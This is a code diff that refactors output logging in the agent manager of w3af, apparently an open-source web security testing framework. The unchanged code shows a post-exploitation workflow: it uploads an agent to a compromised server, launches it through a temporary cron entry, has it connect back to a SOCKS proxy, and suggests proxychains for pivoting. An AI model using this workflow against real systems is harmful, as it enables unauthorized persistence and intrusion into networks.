@@ -26,7 +26,6 @@ import socket
 import time
 from multiprocessing.dummy import Process
 
-import w3af.core.controllers.output_manager as om
 from w3af import ROOT_PATH
 from w3af.core.controllers.extrusion_scanning.extrusion_scanner import extrusionScanner
 from w3af.core.controllers.intrusion_tools.delayed_execution_factory import (
@@ -55,7 +54,9 @@ class w3afAgentManager(Process):
     internally call the run() method.
     """
 
-    def __init__(self, exec_method, ip_address, knowledge_base, socks_port=1080):
+    def __init__(
+        self, exec_method, ip_address, knowledge_base, output, socks_port=1080
+    ):
         Process.__init__(self)
         self.daemon = True
 
@@ -63,6 +64,7 @@ class w3afAgentManager(Process):
         self._exec_method = exec_method
         self._ip_address = ip_address
         self._knowledge_base = knowledge_base
+        self._output = output
         self._socks_port = socks_port
 
         #    Internal
@@ -72,9 +74,9 @@ class w3afAgentManager(Process):
         """
         A wrapper for executing commands
         """
-        om.out.debug("Executing: " + command)
+        self._output.debug("Executing: " + command)
         response = self._exec_method(*(command,))
-        om.out.debug('"' + command + '" returned: ' + response)
+        self._output.debug('"' + command + '" returned: ' + response)
         return response
 
     def run(self):
@@ -87,7 +89,7 @@ class w3afAgentManager(Process):
         try:
             interpreter, client_code, extension = self._select_client()
         except BaseFrameworkException:
-            om.out.error(
+            self._output.error(
                 "Failed to find a suitable w3afAgentClient for the remote server."
             )
         else:
@@ -102,7 +104,7 @@ class w3afAgentManager(Process):
             #
             agent_server = w3afAgentServer(
                 self._ip_address,
-                om.out,
+                self._output,
                 socks_port=self._socks_port,
                 listen_port=inbound_port,
             )
@@ -112,7 +114,7 @@ class w3afAgentManager(Process):
             time.sleep(0.5)
 
             if not agent_server.is_running():
-                om.out.error(agent_server.get_error())
+                self._output.error(agent_server.get_error())
             else:
 
                 #
@@ -120,7 +122,7 @@ class w3afAgentManager(Process):
                 #    to the remote end and run it.
                 #
                 ptf = payload_transfer_factory(
-                    self._exec_method, self._knowledge_base, om.out
+                    self._exec_method, self._knowledge_base, self._output
                 )
                 transferHandler = ptf.get_transfer_handler(inbound_port)
 
@@ -133,17 +135,17 @@ class w3afAgentManager(Process):
                     estimatedTime = transferHandler.estimate_transfer_time(
                         len(client_code)
                     )
-                    om.out.debug(
+                    self._output.debug(
                         'The w3afAgent client transfer will take "'
                         + str(estimatedTime)
                         + '" seconds.'
                     )
 
-                    filename = get_remote_temp_file(self._exec_method, om.out)
+                    filename = get_remote_temp_file(self._exec_method, self._output)
                     filename += "." + extension
 
                     #    Upload the file and check integrity
-                    om.out.console(
+                    self._output.console(
                         f'Starting w3afAgent client upload, remote filename is: "{filename}" ...'
                     )
 
@@ -153,7 +155,7 @@ class w3afAgentManager(Process):
                             "The w3afAgent client failed to upload. Remote file hash does NOT match."
                         )
 
-                    om.out.console("Finished w3afAgent client upload!")
+                    self._output.console("Finished w3afAgent client upload!")
 
                     #    And now start the w3afAgentClient on the remote server using cron / at
                     self._delayedExecution(
@@ -170,7 +172,7 @@ class w3afAgentManager(Process):
                     #    This checks if the remote server connected back to the agent_server
                     #
                     if not agent_server.is_working():
-                        om.out.console(
+                        self._output.console(
                             "Something went wrong, the w3afAgent client failed to connect back."
                         )
                     else:
@@ -179,7 +181,7 @@ class w3afAgentManager(Process):
                         msg += " through the compromised server. We recommend using the proxychains tool "
                         msg += ' ("apt-get install proxychains") to route connections through the proxy, the '
                         msg += f' proxy configuration should look like "socks4    {self._ip_address}     {self._socks_port}"'
-                        om.out.console(msg)
+                        self._output.console(msg)
 
     def is_working(self):
         if self._agent_server is None:
@@ -188,26 +190,26 @@ class w3afAgentManager(Process):
             return self._agent_server.is_working()
 
     def _delayedExecution(self, command):
-        dexecf = delayedExecutionFactory(self._exec_method, om.out)
+        dexecf = delayedExecutionFactory(self._exec_method, self._output)
         dH = dexecf.get_delayed_execution_handler()
 
         if not dH.can_delay():
             msg = "[w3afAgentManager] Failed to create cron entry."
-            om.out.debug(msg)
+            self._output.debug(msg)
             raise BaseFrameworkException(msg)
         else:
             wait_time = dH.add_to_schedule(command)
 
-            om.out.debug("[w3afAgentManager] Crontab entry successfully added.")
+            self._output.debug("[w3afAgentManager] Crontab entry successfully added.")
             wait_time += 2
-            om.out.information(
+            self._output.information(
                 "Please wait "
                 + str(wait_time)
                 + " seconds for w3afAgentClient execution."
             )
             time.sleep(wait_time)
 
-            om.out.debug("[w3afAgentManager] Restoring old crontab.")
+            self._output.debug("[w3afAgentManager] Restoring old crontab.")
             dH.restore_old_schedule()
 
     def _select_client(self):
@@ -256,19 +258,19 @@ class w3afAgentManager(Process):
 
     def _get_inbound_port(self):
         # Do an extrusion scan and return the inbound open ports
-        es = extrusionScanner(self._exec_method, self._knowledge_base, om.out)
+        es = extrusionScanner(self._exec_method, self._knowledge_base, self._output)
         try:
             inbound_port = es.get_inbound_port()
         except Exception as e:
 
-            om.out.error("The extrusion scan failed.")
-            om.out.error("Error: " + str(e))
+            self._output.error("The extrusion scan failed.")
+            self._output.error("Error: " + str(e))
 
             for p in [8080, 5060, 3306, 1434, 1433, 443, 80, 25, 22]:
                 if self._is_locally_available(p) and es.is_available(p, "TCP"):
                     msg = 'Using inbound port "%s" without knowing if the remote'
                     msg += " host will be able to connect back."
-                    om.out.console(msg % p)
+                    self._output.console(msg % p)
                     return p
 
             raise
